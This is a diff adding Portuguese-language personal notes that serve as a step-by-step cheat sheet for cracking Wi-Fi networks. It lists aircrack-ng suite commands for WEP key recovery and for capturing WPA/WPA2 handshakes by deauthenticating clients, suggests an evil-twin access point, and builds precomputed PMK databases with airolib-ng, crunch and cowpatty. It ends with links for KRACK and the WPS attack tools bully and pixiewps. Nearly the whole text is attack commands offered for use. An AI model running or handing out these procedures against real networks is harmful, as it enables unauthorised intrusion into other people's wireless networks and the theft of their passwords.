@@ -1,0 +1,168 @@
+WEP
+
+airmon-ng check kill
+airmon-ng start wlan0
+
+airodump-ng mon0 (copiar os detalhes do alvo)
+
+airodump-ng -c <ch> -w nomedoarquivo --bssid <mac> mon0
+
+ctrl+shift+n
+
+aireplay-ng -1 0 -a <macAP> -e <NomedaRede> mon0 (-h mac falso)
+esperar a mensagem "Association successful"
+
+aireplay-ng -3 -b <macAP> mon0 pode usar -h opcional
+READ
+
+USAR makeivs-ng
+
+ctrl+shift+n
+
+aircrack-ng -b <mac> nomedoarquivo-01.cap
+--------------------------------------------------
+WPA e WPA2
+
+repete os processos iniciais do wep, obtidas as info...
+
+airodump-ng --essid --bssid --channel -w nomedoarquivo mon0
+ctrl+shif+n
+aireplay-ng --deauth 3 -a AP mon0
+se preferir pode fazer o evill twin criando uma rede
+clone e desautenticando a original como airbase-ng.
+
+capturado handshake, podemos fazer a descrypto
+da forma usual forcando o processador a trabalhar muito
+com:
+
+aricrack-ng -w wordlist.txt arquivo-01.cap (-b mac)
+
+ou podemos usar o pre-processamento com um banco de dados:
+
+aircrack-ng -r arquivo.db arquivo-01.cap (-b mac/-e nomeAP)
+------------------------------------------------------------
+Airolib-ng criando banco de dados para senhas de wifi
+
+criar-se o banco ja importando algo ou com r > arquivo.db
+
+airolib-ng namearquivo --import essid nomedoarquivocomosessids.txt
+airolib-ng namearquivo --import passwd nwordlist.txt (.lst)
+
+r > essids.txt
+
+essid1
+essid2
+....
+
+tanto o arquivo essid quanto a wordlist... tem que ser bem parametrados
+marcando a nova insercao com o enter para novo item ser escrito..
+como no exemplo acima a respeito dos essids.
+
+importados essids e passwds iniciamos a formatacao do nosso db
+
+airolib-ng namedoarquivo --clean all
+estamos limpando espacos e excluindo dados invalidos
+
+airolib-ng namedoarquivo --stats
+usaremos com frequencia para monitorar os status do banco de dados
+se tudo esta carregado, ver os essids contidos e se 100% das pass
+estao carregadas e se sim pra quais essids.
+
+airolib-ng nomedoarquivo --batch
+aqui ele vai iniciar o processo de precarregamento
+gerando blocos de pmk's. A dica eh usar um essid para 
+cada banco pois em grande escala de passwords ele demora muito
+se acrescentarmos mais essids o tempo dobre.. entao ou voce usa
+um essid e carrega muitas senhas, ou voce usa muitos essid e carrega
+aos poucos...
+
+airolib-ng nomedoarquivo --verify all
+verifica se tudo ocorreu bem e remove pmk's nao referenciadas.
+
+aircrack-ng -r nomedb arquivo-cap -e essid.
+
+
+basicamente esses comandos devem ser executados de forma consecutivas e na ordem como descrito.
+
+os demais sao utilitarios em geral.
+
+Priorizar um essid:
+
+airolib-ng nomedb --sql 'update essid set prio=(select min(prio)-1 from essid) where essid="VeryImportantEssid";'
+
+resposta 1 rows affected.
+
+buscar padroes importantes na pmk.
+
+airolib-ng namedb --sql 'select hex(pmk) from pmk where hex(pmk) like "%DEADBEEF%"'
+
+deve responder uma hex pmk
+
+importar ou exportar cowpatty
+
+airolib-ng namedb --import cowpatty cowexportoftest
+
+airolib-ng namedb --export cowpatty cowexportftest
+
+importar 1 essid
+
+"echo seuessid | airolib-ng namedb -import essid -"
+
+"echo suasenha | airolib-ng namedb -import passwd -"
+
+
+iniciar processo em lote
+
+("airolib-ng namedb -batch")
+
+checar status
+
+("airolib-ng namedb -stats")
+
+
+interacao com crunch e airolib-ng
+
+crunch 8 8 -t %%%%%%%% --stdout | airolib-ng namedb -import passwd -
+
+
+gerar pmk fora do airolib-ng
+
+genpmk -f caminhodoarquivo .txt ou .lst -d hashes -s nomedarede
+
+gerar tabela cowpatty
+
+cowpatty -d hashfile -r dumpfile -ssid
+
+
+FIM
+
+-------------------------------------------------------------------------------
+
+FALHA KRACK
+
+https://www.krackattacks.com/
+
+
+
+TOPS SCRIPTS GITHUB
+
+https://github.com/jivoi/pentest/find/master
+
+--------------------------------------------------------------------------------------
+
+WPS BULLY DO GITHUB
+
+https://www.youtube.com/watch?v=Ny3IG4X8hHY
+
+link pra download na descicao....
+
+apt-get -y install build-essential libpcap-dev libssl1.0-dev aircrack-ng pixiewps
+
+https://github.com/aanarchyy/bully
+
+git clone https://github.com/wiire/pixiewps
+
+
+Detalhe: Kali Linux 2017.1
+
+
